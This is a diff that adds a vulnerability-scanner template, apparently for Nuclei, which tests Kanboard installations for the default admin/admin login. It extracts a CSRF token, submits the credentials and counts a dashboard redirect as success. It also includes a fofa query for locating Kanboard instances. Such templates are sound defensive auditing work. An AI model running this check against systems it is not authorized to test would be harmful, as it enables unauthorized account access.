@@ -1,0 +1,54 @@
+http:
+    - attack: pitchfork
+      cookie-reuse: true
+      extractors:
+        - group: 1
+          internal: true
+          name: csrf_token
+          part: body
+          regex:
+            - hidden" name="csrf_token" value="([0-9a-z]+)"
+          type: regex
+      matchers:
+        - condition: and
+          dsl:
+            - contains(location, 'controller=DashboardController&action=show')
+            - status_code == 302
+          type: dsl
+      payloads:
+        pass:
+            - admin
+        user:
+            - admin
+      raw:
+        - |
+          GET /?controller=AuthController&action=login HTTP/1.1
+          Host: {{Hostname}}
+        - |
+          POST /?controller=AuthController&action=check HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          username={{user}}&password={{pass}}&csrf_token={{csrf_token}}
+id: kanboard-default-login
+info:
+    author: shelled
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+        cvss-score: 8.3
+        cwe-id: CWE-522
+    description: Kanboard contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
+    metadata:
+        fofa-query: app="Kanboard"
+        max-request: 2
+        verified: true
+    name: Kanboard - Default Login
+    reference:
+        - https://twitter.com/0x_rood/status/1607068644634157059
+        - https://github.com/kanboard/kanboard
+        - https://docs.kanboard.org/v1/admin/installation/
+    severity: high
+    tags:
+        - default-login
+        - kanboard
+        - Kanboard
